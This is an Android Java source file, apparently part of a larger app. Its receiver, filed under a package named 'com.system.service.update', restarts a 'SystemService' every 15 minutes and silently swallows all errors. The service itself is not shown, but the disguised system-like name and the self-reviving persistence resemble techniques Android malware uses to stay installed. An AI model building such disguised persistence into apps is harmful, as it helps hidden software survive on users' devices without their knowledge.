// AlarmReceiver.java
package com.system.service.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ActivityManager;

public class AlarmReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        // Check if service is running
        if (!isServiceRunning(context)) {
            startService(context);
        }
        
        // Reschedule next alarm
        rescheduleAlarm(context);
    }
    
    private boolean isServiceRunning(Context context) {
        try {
            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (manager == null) return false;
            
            String packageName = context.getPackageName();
            
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (service.service.getClassName().contains(packageName)) {
                    return true;
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
        return false;
    }
    
    private void startService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, SystemService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void rescheduleAlarm(Context context) {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if (alarmManager == null) return;
            
            Intent alarmIntent = new Intent(context, AlarmReceiver.class);
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context, 0, alarmIntent, flags
            );
            
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                900000, // 15 minutes
                900000, // Repeat every 15 minutes
                pendingIntent
            );
        } catch (Exception e) {
            // Silent fail
        }
    }
}
